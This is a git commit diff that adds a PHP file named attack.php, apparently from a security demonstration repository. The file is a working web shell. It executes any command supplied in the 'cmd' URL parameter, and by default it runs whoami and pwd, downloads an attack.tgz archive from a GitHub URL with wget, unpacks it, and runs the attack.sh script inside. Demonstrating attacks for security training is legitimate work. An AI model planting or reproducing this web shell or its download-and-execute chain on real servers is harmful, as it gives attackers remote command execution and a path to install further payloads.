10d674d063d619b1834d03c661f602d7e61f2414
Stéphane List <slist@lilotux.net>
2021-09-02 11:48:28 +0200

    Create attack.php

---
+++ skullify/attack.php
@@ -0,0 +1,28 @@
+<?php
+
+$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'pwd';
+echo "Executing shell command:-> $cmd</br>";
+$output = shell_exec($cmd);
+echo "<pre>$output</pre>";
+
+$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'whoami';
+echo "Executing shell command:-> $cmd</br>";
+$output = shell_exec($cmd);
+echo "<pre>$output</pre>";
+
+$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'wget https://github.com/slist/security-demo/raw/master/skullify/attack.tgz';
+echo "Executing shell command:-> $cmd</br>";
+$output = shell_exec($cmd);
+echo "<pre>$output</pre>";
+
+$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'tar zxvf attack.tgz';
+echo "Executing shell command:-> $cmd</br>";
+$output = shell_exec($cmd);
+echo "<pre>$output</pre>";
+
+$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '/var/www/html/attack.sh';
+echo "Executing shell command:-> $cmd</br>";
+$output = shell_exec($cmd);
+echo "<pre>$output</pre>";
+
+?>
